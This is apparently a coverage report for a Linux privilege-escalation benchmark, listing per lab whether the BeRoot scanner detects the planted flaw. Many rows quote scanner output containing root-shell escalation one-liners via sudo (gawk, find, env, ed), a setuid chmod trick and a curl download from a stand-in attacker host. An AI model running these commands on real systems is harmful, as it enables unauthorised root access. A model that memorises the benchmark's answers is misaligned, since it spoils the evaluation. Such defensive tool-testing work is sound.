# BeRoot coverage per benchmark target

One row per lab in the RamiGPT benchmark suite (**285** targets). Indicates whether
[BeRoot](../../tools/beroot/Linux/) would surface the intentional misconfiguration when
run as `lowpriv` (as in benchmark / `ramigpt/web/tools/beroot.py`).

**Remote verification** on `10.10.1.109` (cred: 63 Yes, 0 No; other: 197 Yes, 25 No) — see [`beroot-cred-verify.json`](beroot-cred-verify.json) and [`beroot-verify.json`](beroot-verify.json).













## Legend

| Verdict | Meaning |
|---------|---------|
| **Yes** | BeRoot has a check that reliably flags the primary misconfiguration (sudo labs include the runner's `sudo -l` enrichment when BeRoot's `sudo -ll` parser misses rules). |
| **No** | No BeRoot check covers this vector (or the exact chain is not flagged - e.g. deferred sudo env_keep/writable-hook labs). |

## BeRoot check categories

- `file_permissions`
- `services_files_permissions`
- `suid_bins`
- `sudoers_misconfiguration`
- `sudo_list`
- `sudo_dirty_check`
- `docker_installed`
- `docker_mounted_sockets`
- `nfs_root_squashing`
- `ldpreload`
- `capabilities`
- `ptrace_scope`
- `exploits`
- `python_library_hijacking`
- `credential_leaks`
- `sgid_bins`
- `doas_rules`
- `network_services`
- `env_keep_directives`
- `shell_restrictions`
- `system_info`
- `mysql_socket`
- `writable_path_dirs`

## Summary

| Verdict | Count |
|---------|------:|
| Yes | 260 |
| No | 25 |
| **Total** | **285** |

## All targets

| Target | Port | Family | BeRoot finds? | Notes |
|--------|-----:|--------|:-------------:|-------|
| `apparmor-detect-only` | 2362 | services | **Yes** | system_info (verified 2026-07-25 on 10.10.1.109) — apparmor-status: enabled=Y \| next: run aa-status; inspect /etc/apparmor.d and /sys/module/apparmor \| apparmor-status: Y (from /opt/bench/apparmor-enabled.txt) \| |
| `at-allow` | 2245 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /opt/bench/atjob [writable] \| path: /etc/at.allow [writable] \| /opt/bench/atjob [writable] |
| `cap-chown` | 2180 | capabilities | **Yes** | capabilities (verified 2026-07-25 on 10.10.1.109) — /usr/bin/python3.14 cap_chown: ep |
| `cap-dac-override` | 2184 | capabilities | **Yes** | capabilities (verified 2026-07-25 on 10.10.1.109) — /usr/bin/python3.14 cap_dac_override: ep |
| `cap-dac-read` | 2228 | capabilities | **Yes** | capabilities (verified 2026-07-25 on 10.10.1.109) — /usr/bin/python3.14 cap_dac_read_search: ep |
| `cap-fowner` | 2185 | capabilities | **Yes** | capabilities (verified 2026-07-25 on 10.10.1.109) — /usr/bin/python3.14 cap_fowner: ep |
| `cap-fsetid` | 2189 | capabilities | **Yes** | capabilities (verified 2026-07-25 on 10.10.1.109) — /usr/bin/python3.14 cap_fowner,cap_fsetid: ep |
| `cap-net-bind` | 2315 | capabilities | **Yes** | capabilities (verified 2026-07-25 on 10.10.1.109) — /usr/bin/python3.14 cap_dac_read_search,cap_net_bind_service: ep |
| `cap-python` | 2218 | capabilities | **Yes** | capabilities (verified 2026-07-25 on 10.10.1.109) — /usr/bin/python3.14 cap_setuid: ep |
| `cap-setfcap` | 2267 | capabilities | **Yes** | capabilities (verified 2026-07-25 on 10.10.1.109) — /usr/bin/python3.14 cap_fowner,cap_fsetid: ep |
| `capabilities-detect-only` | 2391 | services | **Yes** | capabilities / system_info (verified 2026-07-25 on 10.10.1.109) — cap-hints: /usr/bin/python3 cap_setuid=ep (from /opt/bench/cap-hints.txt) \| next: abuse listed capabilities (cap_setuid/cap_dac_override/...) \| next: run getcap |
| `cgroup-detect-only` | 2450 | services | **Yes** | system_info (verified 2026-07-25 on 10.10.1.109) — cgroup-surface: cgroupfs mounted \| next: enumerate /sys/fs/cgroup for writable release_agent/delegate \| cgroup-surface: tmpfs on /sys/fs/cgroup type tmpfs (rw,n |
| `cred-adm-log` | 2181 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /var/log/bench-secure.log: Jul 15 12:00:01 bench NOTE: root password for break-glass is: password |
| `cred-ansible` | 2239 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.ansible/vault_pass.txt: password \| /opt/ansible/group_vars_all.yml: ansible_ssh_pass: password |
| `cred-aws-creds` | 2298 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.aws/credentials: root_password=password |
| `cred-backup-secrets` | 2280 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /var/backups/credentials.txt: root_password=password |
| `cred-bash-profile` | 2383 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.bash_profile: export ROOT_PASS=password |
| `cred-boto` | 2446 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.boto: root_password = password |
| `cred-chef` | 2441 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /etc/chef/client.rb: root_password "password" |
| `cred-chromium` | 2410 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.config/chromium/bench_prefs.json: {"credentials":{"root_password":"password"}} |
| `cred-ci-vars` | 2423 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/ci.env: ROOT_PASSWORD=password |
| `cred-cleartext` | 2177 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/credentials.txt: root_password=password |
| `cred-core-dump` | 2241 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /var/crash/bench-app.core: recover password: password |
| `cred-docker-config` | 2318 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.docker/config.json: auth decoded root:password |
| `cred-docker-env` | 2422 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.docker/.env: ROOT_PASSWORD=password |
| `cred-env-file` | 2274 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /etc/environment: ROOT_PASS=password |
| `cred-env-local` | 2317 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.env: ROOT_PASSWORD=password |
| `cred-filezilla` | 2416 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.config/filezilla/sitemanager.xml: <User><Site><Pass encoding="plain">password</Pass></Site></User> |
| `cred-firefox` | 2411 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.mozilla/firefox/bench.default/logins.json: {"logins":[{"hostname":"bench","encryptedPassword":"password"}]} |
| `cred-ftp-netrc` | 2394 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.netrc: machine ftp.example.com login root password password |
| `cred-gcloud` | 2379 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.config/gcloud/bench.properties: root_password=password |
| `cred-git-config` | 2288 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.git-credentials: https://root:password@127.0.0.1 |
| `cred-gitconfig-global` | 2392 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.gitconfig: rootPassword = password |
| `cred-gnupg` | 2443 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.gpg-passphrase: password |
| `cred-hg` | 2385 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.config/hg/hgrc: bench.password=password |
| `cred-history` | 2178 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.bash_history: # root password is: password |
| `cred-irssi` | 2380 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.irssi/config: servers = ( { password = "password"; } ); |
| `cred-jenkins-secrets` | 2320 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/jenkins_backup/credentials.xml: <password>password</password> |
| `cred-keepass` | 2424 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/keepass-export.xml: <Password>password</Password> |
| `cred-krb5` | 2409 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/krb5.conf: root_password = password |
| `cred-kubeconfig` | 2319 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.kube/config: token: password |
| `cred-ldap` | 2408 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/ldap.conf: root_password password |
| `cred-lesshst` | 2378 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.lesshst: su root password |
| `cred-mongodb` | 2444 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.mongorc.js: // root password: password |
| `cred-msf4` | 2420 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.msf4/config: root_password=password |
| `cred-msmtp` | 2393 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.msmtprc: password password |
| `cred-muttrc` | 2381 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.muttrc: set imap_pass=password |
| `cred-mysql-cnf` | 2297 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.my.cnf: password=password |
| `cred-netrc` | 2287 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.netrc: login root |
| `cred-npmrc` | 2360 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.npmrc: root_password=password |
| `cred-openvpn` | 2454 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/openvpn.auth: root / password |
| `cred-pass-store` | 2442 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.password-store/root.gpg: root_password=password |
| `cred-pgpass` | 2302 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.pgpass: 127.0.0.1:5432:bench:root:password |
| `cred-pip-conf` | 2447 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.config/pip/pip.conf: root_password = password |
| `cred-puppet-secrets` | 2321 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /etc/facter/facts.d/root_pass.json: {"root_password":"password"} |
| `cred-pypirc` | 2438 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.pypirc: password = password |
| `cred-rclone` | 2439 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.config/rclone/rclone.conf: pass = password |
| `cred-redis-cli` | 2412 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.rediscli.rc: root_password password |
| `cred-resolv-creds` | 2342 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/resolv.override: root_password=password |
| `cred-root-key` | 2230 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/root_id_rsa [readable private key] \| /tmp/root_id_rsa [readable private key] |
| `cred-s3cfg` | 2382 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.s3cfg: secret_key=password |
| `cred-salt` | 2440 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /etc/salt/minion: root_password: password |
| `cred-screenlog` | 2384 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/screenlog.0: root login password=password |
| `cred-secrets-yml` | 2421 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/secrets.yml: root_password: password |
| `cred-shadow-read` | 2227 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /etc/shadow [readable] |
| `cred-slack` | 2445 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.slack-token: root_password=password |
| `cred-ssh-config` | 2361 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.ssh/config: # planted root password for lab: password |
| `cred-subversion` | 2407 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.subversion/auth/svn.simple/bench: root |
| `cred-systemd-env` | 2413 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /etc/environment: ROOT_PASS=password |
| `cred-terraform` | 2414 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/terraform.tfvars: root_password = "password" |
| `cred-tmux-conf` | 2346 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.tmux.conf: set-environment -g ROOT_PASS password |
| `cred-tokens-json` | 2448 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/tokens.json: {"root_password":"password"} |
| `cred-vault-token` | 2415 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.vault-token: password |
| `cred-viminfo` | 2364 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.viminfo: su root password |
| `cred-wgetrc` | 2301 | credentials | **Yes** | credential_leaks (verified 2026-07-24 on 10.10.1.109) — /home/lowpriv/.wgetrc: password=password |
| `dbus-detect-only` | 2449 | services | **Yes** | system_info (verified 2026-07-25 on 10.10.1.109) — dbus-surface: dbus-daemon-absent \| no-system-bus-socket (from /opt/bench/dbus-surface.txt) \| next: inspect /etc/dbus-1/system.d; try busctl list \| next: read /o |
| `doas-nopass` | 2273 | doas | **Yes** | doas_rules (verified 2026-07-25 on 10.10.1.109) — doas -n id => uid=0(root) |
| `docker-detect-only` | 2389 | services | **Yes** | system_info / docker (verified 2026-07-25 on 10.10.1.109) — docker-surface: docker-cli-absent \| docker-sock-absent \| lowpriv (from /opt/bench/docker-surface.txt) \| next: check docker.sock perms/group; try docker run -v / |
| `exploits-detect-only` | 2349 | services | **Yes** | exploits (verified 2026-07-25 on 10.10.1.109) — next: review Possible Exploits CVEs below; verify kernel/package versions before attempting \| [1;37mPossible Exploits:[0m \| [+] [1;32m[CVE-2021-3156][0m sud |
| `fstab-detect-only` | 2390 | services | **Yes** | system_info (verified 2026-07-25 on 10.10.1.109) — fstab-status: readable but no active entries \| next: read /etc/fstab; compare with findmnt/mount \| fstab-surface: # UNCONFIGURED FSTAB FOR BASE SYSTEM (from /op |
| `kernel-detect-only` | 2339 | services | **Yes** | exploits (verified 2026-07-25 on 10.10.1.109) — next: review Possible Exploits CVEs below; verify kernel/package versions before attempting \| [1;37mPossible Exploits:[0m \| [+] [1;32m[CVE-2021-3156][0m sud |
| `ld-preload-script` | 2246 | path | **Yes** | writable_path_dirs (verified 2026-07-25 on 10.10.1.109) — /dev/shm [writable] \| /tmp [writable] \| /var/tmp [writable] \| /opt/bench/preload.so [writable] \| /opt/bench/rootwrap.sh [writable] \| /tmp/preloadscript.c [writa |
| `logrotate-writable` | 2240 | writable | **Yes** | file_permissions (verified 2026-07-25 on 10.10.1.109) — path: /etc/logrotate.d/bench \| subfiles: \| - [writable: /opt/bench/logrotate-hook.sh] => /opt/bench/logrotate-hook.sh \| path: /opt/bench/logrotate-hook.sh [writ |
| `mounts-detect-only` | 2451 | services | **Yes** | system_info (verified 2026-07-25 on 10.10.1.109) — mount-option: proc on /proc type proc (rw,nosuid,nodev,noexec,relatime) \| next: review findmnt -o TARGET,OPTIONS for weak/no_root_squash mounts \| mount-option: |
| `mysql-socket` | 2263 | credentials | **Yes** | mysql_socket (verified 2026-07-25 on 10.10.1.109) — mysql socket: /var/run/mysqld/mysqld.sock \| mysql root socket login without password |
| `namespaces-detect-only` | 2417 | services | **Yes** | system_info (verified 2026-07-25 on 10.10.1.109) — userns-surface: unprivileged_userns_clone=1 \| next: inspect unprivileged_userns_clone and /proc/self/ns \| apparmor-status: enabled=Y \| next: run aa-status; insp |
| `nfs-exports` | 2220 | nfs | **Yes** | nfs_root_squashing (verified 2026-07-25 on 10.10.1.109) — no_root_squash directive found |
| `node-path-hijack` | 2260 | path | **Yes** | writable_path_dirs (verified 2026-07-25 on 10.10.1.109) — /dev/shm [writable] \| /tmp [writable] \| /var/tmp [writable] \| /opt/bench/nodeinc [writable] \| localhost udp listener: udp   UNCONN 0      0               127.0. |
| `path-hijack` | 2232 | path | **Yes** | writable_path_dirs (verified 2026-07-25 on 10.10.1.109) — /opt/pathhijack [writable] \| /dev/shm [writable] \| /tmp [writable] \| /var/tmp [writable] \| path: /opt/pathhijack/runme [writable] \| localhost udp listener: udp |
| `php-auto-prepend` | 2310 | python | **Yes** | writable_path_dirs (verified 2026-07-25 on 10.10.1.109) — /dev/shm [writable] \| /tmp [writable] \| /var/tmp [writable] \| /opt/bench/prepend.php [writable] \| /opt/bench/run.php [writable] \| path: /opt/bench/prepend.php [ |
| `php-include-hijack` | 2259 | python | **Yes** | writable_path_dirs (verified 2026-07-25 on 10.10.1.109) — /dev/shm [writable] \| /tmp [writable] \| /var/tmp [writable] \| /opt/bench/phpinc [writable] |
| `pkexec-detect-only` | 2418 | services | **Yes** | system_info (verified 2026-07-25 on 10.10.1.109) — pkexec-surface: pkexec-absent (from /opt/bench/pkexec-surface.txt) \| next: inspect /usr/bin/pkexec mode and /usr/share/polkit-1 policies \| next: read /opt/bench |
| `ptrace-detect-only` | 2387 | services | **Yes** | ptrace_scope (verified 2026-07-25 on 10.10.1.109) — yama/ptrace_scope == 1 \| next: read /proc/sys/kernel/yama/ptrace_scope; scope>0 blocks attach \| ptrace-surface: 1 (from /opt/bench/ptrace-scope.txt) \| next: rea |
| `python-cwd` | 2238 | python | **Yes** | writable_path_dirs (verified 2026-07-25 on 10.10.1.109) — /dev/shm [writable] \| /tmp [writable] \| /var/tmp [writable] \| /home/lowpriv/cwd_hijack [writable] |
| `python-hijack` | 2219 | python | **Yes** | python_library_hijacking (verified 2026-07-25 on 10.10.1.109) — /usr/lib/python3.14 |
| `rbash-escape` | 2251 | shell | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-22 on 10.10.1.109 — no restricted-shell check; BeRoot upload blocked in rbash |
| `redis-unauth` | 2300 | services | **Yes** | network_services (verified 2026-07-25 on 10.10.1.109) — next: identify listener owners (ss -tulnp); probe with nc/curl/redis-cli \| redis listener: tcp   LISTEN 0      511             127.0.0.1:6379      0.0.0.0:* \| r |
| `root-tcp-service` | 2261 | path | **Yes** | network_services (verified 2026-07-25 on 10.10.1.109) — localhost tcp listener: tcp   LISTEN 0      5               127.0.0.1:8877      0.0.0.0:* \| /dev/shm [writable] \| /tmp [writable] \| /var/tmp [writable] \| localh |
| `root-udp-service` | 2316 | services | **Yes** | network_services (verified 2026-07-25 on 10.10.1.109) — localhost udp listener: udp   UNCONN 0      0               127.0.0.1:9998      0.0.0.0:* \| next: probe UDP listeners (nc -u 127.0.0.1 <port>) as lowpriv \| next |
| `selinux-detect-only` | 2388 | services | **Yes** | system_info (verified 2026-07-25 on 10.10.1.109) — selinux-status: unavailable (from /opt/bench/selinux-status.txt) \| next: run getenforce/sestatus; read /etc/selinux/config \| next: read /opt/bench/selinux-statu |
| `sgid-secret` | 2231 | sgid | **Yes** | sgid_bins (verified 2026-07-25 on 10.10.1.109) — /opt/bench/sgidcat [non-standard] \| /usr/bin/chage \| /usr/bin/expiry \| /usr/bin/at \| /usr/bin/ssh-agent \| /usr/bin/crontab \| /usr/sbin/unix_chkpwd \| /usr/sbin/p |
| `sudo-all` | 2170 | sudo-advanced | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: all \| ALL: all permissions \| Matching Defaults entries for lowpriv on ubuntu: \| env_reset, mail_badpass, \| secure_path=/usr/lo |
| `sudo-ansible` | 2275 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-awk` | 2212 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/awk \| gtfobins found (gawk): \| - sudo gawk 'BEGIN {system("/bin/sh")}' \| Matching Defaults entries for lowpriv on ubu |
| `sudo-backup` | 2265 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-base64` | 2281 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/base64 \| gtfobins found (base64): \| - LFILE=file_to_read \| - sudo base64 "$LFILE" \| base64 --decode \| Matching Defaul |
| `sudo-bash` | 2179 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /bin/bash \| gtfobins found (bash): \| - sudo bash \| Matching Defaults entries for lowpriv on ubuntu: \| env_reset, mail_badpass, |
| `sudo-bash-env` | 2193 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-cat` | 2290 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/cat \| gtfobins found (cat): \| - LFILE=file_to_read \| - sudo cat "$LFILE" \| Matching Defaults entries for lowpriv on u |
| `sudo-chmod` | 2191 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /bin/chmod \| gtfobins found (chmod): \| - LFILE=file_to_change \| - sudo chmod 6777 $LFILE \| Matching Defaults entries for lowpr |
| `sudo-column` | 2327 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/column \| gtfobins found (column): \| - LFILE=file_to_read \| - sudo column $LFILE \| Matching Defaults entries for lowpr |
| `sudo-comm` | 2329 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/comm \| gtfobins found (comm): \| - LFILE=file_to_read \| - sudo comm $LFILE /dev/null 2>/dev/null \| Matching Defaults e |
| `sudo-composer` | 2247 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-cp` | 2222 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — Matching Defaults entries for lowpriv on ubuntu: \| env_reset, mail_badpass, \| secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/sn |
| `sudo-csplit` | 2352 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/csplit \| gtfobins found (csplit): \| - LFILE=file_to_read \| - csplit $LFILE 1 \| - cat xx01 \| Matching Defaults entries |
| `sudo-curl` | 2203 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/curl \| gtfobins found (curl): \| - URL=http://attacker.com/file_to_get \| - LFILE=file_to_save \| - sudo curl $URL -o $L |
| `sudo-cut` | 2282 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/cut \| gtfobins found (cut): \| - LFILE=file_to_read \| - sudo cut -d "" -f1 "$LFILE" \| Matching Defaults entries for lo |
| `sudo-dd` | 2192 | sudo | **No** | verified 2026-07-25 on 10.10.1.109 — Authentication failed. |
| `sudo-diff` | 2306 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/diff \| gtfobins found (diff): \| - LFILE=file_to_read \| - sudo diff --line-format=%L /dev/null $LFILE \| Matching Defau |
| `sudo-dos2unix` | 2400 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — Matching Defaults entries for lowpriv on ubuntu: \| env_reset, mail_badpass, \| secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/sn |
| `sudo-ed` | 2435 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/ed \| gtfobins found (ed): \| - sudo ed \| - !/bin/sh \| Matching Defaults entries for lowpriv on ubuntu: \| env_reset, ma |
| `sudo-egrep` | 2398 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — Matching Defaults entries for lowpriv on ubuntu: \| env_reset, mail_badpass, \| secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/sn |
| `sudo-env` | 2210 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/env \| gtfobins found (env): \| - sudo env /bin/sh \| Matching Defaults entries for lowpriv on ubuntu: \| env_reset, mail |
| `sudo-expand` | 2314 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/expand \| gtfobins found (expand): \| - LFILE=file_to_read \| - sudo expand "$LFILE" \| Matching Defaults entries for low |
| `sudo-find` | 2205 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/find \| gtfobins found (find): \| - sudo find . -exec /bin/sh \; -quit \| Matching Defaults entries for lowpriv on ubunt |
| `sudo-fmt` | 2328 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/fmt \| gtfobins found (fmt): \| - LFILE=file_to_read \| - sudo fmt -999 "$LFILE" \| Matching Defaults entries for lowpriv |
| `sudo-fold` | 2322 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/fold \| gtfobins found (fold): \| - LFILE=file_to_read \| - sudo fold -w99999999 "$LFILE" \| Matching Defaults entries fo |
| `sudo-gem` | 2250 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-git-hook` | 2244 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-grep` | 2294 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/grep \| gtfobins found (grep): \| - LFILE=file_to_read \| - sudo grep '' $LFILE \| Matching Defaults entries for lowpriv |
| `sudo-group` | 2171 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-hd` | 2323 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/hd \| gtfobins found (hexdump): \| - LFILE=file_to_read \| - sudo hexdump -C "$LFILE" \| Matching Defaults entries for lo |
| `sudo-head` | 2291 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/head \| gtfobins found (head): \| - LFILE=file_to_read \| - sudo head -c1G "$LFILE" \| Matching Defaults entries for lowp |
| `sudo-hexdump` | 2350 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/hexdump \| gtfobins found (hexdump): \| - LFILE=file_to_read \| - sudo hexdump -C "$LFILE" \| Matching Defaults entries f |
| `sudo-iconv` | 2354 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/iconv \| gtfobins found (iconv): \| - LFILE=file_to_read \| - ./iconv -f 8859_1 -t 8859_1 "$LFILE" \| Matching Defaults e |
| `sudo-install` | 2198 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/install \| gtfobins found (install): \| - LFILE=file_to_change \| - TF=$(mktemp) \| - sudo install -m 6777 $LFILE $TF \| M |
| `sudo-join` | 2351 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/join \| gtfobins found (join): \| - LFILE=file_to_read \| - sudo join -a 2 /dev/null $LFILE \| Matching Defaults entries |
| `sudo-jq` | 2373 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/jq \| gtfobins found (jq): \| - LFILE=file_to_read \| - sudo jq -Rr . "$LFILE" \| Matching Defaults entries for lowpriv o |
| `sudo-ld-library-path` | 2183 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
